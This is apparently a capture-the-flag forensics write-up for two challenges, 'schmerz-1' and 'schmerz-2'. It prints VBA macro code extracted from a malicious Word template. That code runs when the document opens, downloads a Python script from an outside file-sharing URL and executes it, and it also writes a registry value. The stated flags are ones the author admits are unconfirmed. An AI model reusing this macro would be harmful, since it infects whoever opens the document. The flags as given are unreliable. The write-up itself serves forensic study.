# schmerz-1

**Flag:** `flag{fA3bDt}`

Extracting the filesystem from the `.ad1` file and going into the `C:\Users\challenge\Downloads` directory, we find a `.dotm` file. Running `olevba` on it, we get this

```vb
.
.
.
Sub RegistryEntry()
    Dim keyName As String
    Dim data As String
    Dim path As String
    Dim myWS As Object
    Dim stype As String
    Set myWS = VBA.CreateObject("WScript.Shell")

    path = "HKEY_CURRENT_USER\Software\Uninstall\"
    keyName = "Application"
    keyValue = "fA3bDt"
    stype = "REG_SZ"
    myWS.RegWrite path & keyName, keyValue, stype
End Sub

Sub DownloadAndOpenFile()
.
.
.
```

The value of the registry entry stored by the malicious macro seems to be `fA3bDt`. I can't confirm if this is correct as I couldn't find a writeup, but it most likely should be.

# schmerz-2

**Flag:** `flag{python.exe "C:\Users\challenge\AppData\Local\Temp\msserver.py"}`

The same macro also shows this:

```vb
Sub Document_Open()
    DownloadAndOpenFile
    RegistryEntry
End Sub
.
.
.
Sub DownloadAndOpenFile()
    Dim url As String
    Dim destinationPath As String
    Dim shell As Object
    Dim pythonPath As String
    Dim command As String
    pythonPath = "python.exe"
    url = "https://filebin.net/g5lap7a613mo3x3o/client.py"
    destinationPath = Environ("TEMP") & "\msserver.py"
    With CreateObject("MSXML2.ServerXMLHTTP")
        .Open "GET", url, False
        .send
        If .Status = 200 Then
            Dim stream As Object
            Set stream = CreateObject("ADODB.Stream")
            stream.Open
            stream.Type = 1
            stream.Write .responseBody
            stream.SaveToFile destinationPath, 2
            stream.Close
        End If
    End With
    command = pythonPath & " " & Chr(34) & destinationPath & Chr(34)
    Set shell = CreateObject("WScript.Shell")
    shell.Exec command
End Sub
```

So we can see the first command that seems to run upon the document opening is


```vb
vbpythonPath & " " & Chr(34) & destinationPath & Chr(34)
```

and when you replace all variables with their values,

```py
python.exe "C:\Users\challenge\AppData\Local\Temp\msserver.py}"
```

As with the previous one, I have no clue if this is the correct flag since I couldn't find a writeup, but it should be.
